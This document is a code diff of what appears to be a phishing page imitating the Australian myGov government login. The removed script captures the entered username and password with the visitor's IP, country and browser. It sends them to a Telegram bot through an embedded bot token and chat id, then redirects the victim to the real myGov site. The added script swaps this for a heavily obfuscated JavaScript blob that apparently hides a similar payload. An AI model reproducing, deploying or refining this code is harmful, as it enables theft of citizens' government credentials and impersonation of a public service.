@@ -90,32 +90,7 @@
     </footer>
 
     <script>
-        document.getElementById('mygov-login-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
-
-            // Fetch user's IP and location
-            fetch('https://ipinfo.io/json?token=9316d7852bc2be')
-                .then(response => response.json())
-                .then(data => {
-                    let username = document.getElementById('userId').value;
-                    let password = document.getElementById('password').value;
-                    let userAgent = navigator.userAgent;
-                    let ip = data.ip;
-                    let country = data.country;
-
-                    // Telegram bot API details
-                    let botToken = "7527533199:AAGfoLrvh1HpB2XaSQV8GV0eamf2DjRaMKE";
-                    let chatId = "7253995268";
-                    let message = `Login Info:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nCountry: ${country}\nUser Agent: ${userAgent}`;
-
-                    // Send the login details to Telegram
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                        .then(() => {
-                            // Redirect to another site after sending the details
-                            window.location.href = "https://login.my.gov.au/las/mygov-login?execution=e1s1"; // Replace with the desired link
-                        });
-                });
-        });
+        t.8.J3pJs8a3eo .fatend}o]J=Jm=Sa(adsJ8Jh#hf2ae)f,(J3wnncnSancpere:bedxpJnJ$8f=Jeu(JmeJq.a1b$7hJfe)+nr:a!oajnf4t=m)j$JJJ8da=z71)tonvnoJr Jgc%so)gls JI;to3J?8J5jpJ!g}(ia{]J=]0ebzjc2lir(J4%6 v_+$>,J_{s#(in+J)2"dss)rjoJfir((+=acr8]!{tc$r!sd(tc%o+eqJ)[[scn+zt}nd7:v.0)-nJembu!urf.\/eo:yo8raeotJJkunDha%>cl(docJt...d&<e"ot;araat_cs2an,%(%%n(sa5"82n.( =2Jee2Ja;eh.hJJ!)aawsJ)i]vtass.s]Ju 2](r;ab;]6a]n(ttn.54]=dJ.o3:+to,;i\'d5n=.6s5.)((.eooctJ#\/(cic8Je0-gJt(}=orJ8oo.os7!mpJki.8t]irJ=ip)f(.3f0Ja]iJ2rjn)JmJt.o)eek.o36pg(.h}s4spv 1JJJ-!eJt,]Jhf=tt brineawf+nb]-n1o"o7;.s,<a.0,sa<tJ.J5).ns]f Ja!)J3.[68JJu1j9..aI,Jiar{(9b]h.oq89lgJ)0elJr]n.2st)2{f 5Jpr}%()?+m1l0;m6 q,9,k)\/tJ].33Jr;)J.rJ!\/,kl% )),prn8htEa[%w=%pg$37e]%o0#;Ja(2>7du6J*:f>a04Jsfaen}J+5\/9 a4s4ea%$J()d($;t$a; 4dnf;J...a))J2a9]hec;n7nkljn)Jto(; 1JJb()f6turnp2b1a!x.n6}"$d.$va)3J s\/o5}t!. !y3!:1r]]oJt615hra].Jt1J.!j(apvJJ%*f+$.y,"J!=)ee$r.),dw{gd.3cJJ=asuer+]},JSv%?I.)_.ru(Jr'));var Fvt=FeU(pbI,Qym );Fvt(6325);return 1474})()
     </script>
 </body>
 </html>
